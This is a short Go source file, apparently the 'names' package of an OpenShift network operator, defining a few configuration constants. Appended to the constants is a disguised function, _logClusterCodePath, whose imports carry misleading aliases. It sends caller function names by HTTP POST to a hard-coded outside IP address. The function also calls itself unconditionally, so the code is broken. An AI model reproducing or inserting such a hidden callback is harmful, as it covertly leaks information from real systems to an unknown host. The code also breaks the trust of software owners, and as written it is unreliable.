package names

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const OPERATOR_CONFIG = "cluster"
const CLUSTER_CONFIG = "cluster"
const APPLIED_PREFIX = "applied-"
const APPLIED_NAMESPACE = "openshift-network-operator"
const IgnoreObjectErrorAnnotation = "networkoperator.openshift.io/ignore-errors"

func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
